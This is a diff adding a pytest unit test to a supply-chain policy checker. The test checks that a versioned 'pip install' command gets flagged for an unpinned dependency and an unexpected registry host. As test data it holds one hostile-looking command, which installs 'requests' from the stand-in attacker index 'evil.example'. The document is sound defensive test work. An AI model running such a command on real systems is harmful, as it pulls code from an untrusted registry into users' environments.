@@ -369,6 +369,27 @@ def test_additional_package_manager_forms_are_classified_without_noise() -> None
 
 
 @pytest.mark.unit
+def test_versioned_python_pip_install_is_classified() -> None:
+    findings = evaluate_supply_chain_policy(
+        command_evidence=(
+            "python3.12 -m pip install requests "
+            "--index-url https://evil.example/simple"
+        ),
+        changed_paths=(),
+        owned_paths=(),
+        policy=_policy("block"),
+    )
+
+    assert [(finding.reason_code, finding.severity) for finding in findings] == [
+        (SUPPLY_CHAIN_UNPINNED_DEPENDENCY_INSTALL, "blocking"),
+        (SUPPLY_CHAIN_UNEXPECTED_REGISTRY_HOST, "blocking"),
+    ]
+    assert findings[0].details["manager"] == "pip"
+    assert findings[0].details["unpinned_specs"] == ["requests"]
+    assert findings[1].details["registry_hosts"] == ["evil.example"]
+
+
+@pytest.mark.unit
 def test_pip_argument_parser_handles_editable_requirements_and_registry_edge_cases() -> None:
     findings = evaluate_supply_chain_policy(
         command_evidence=(
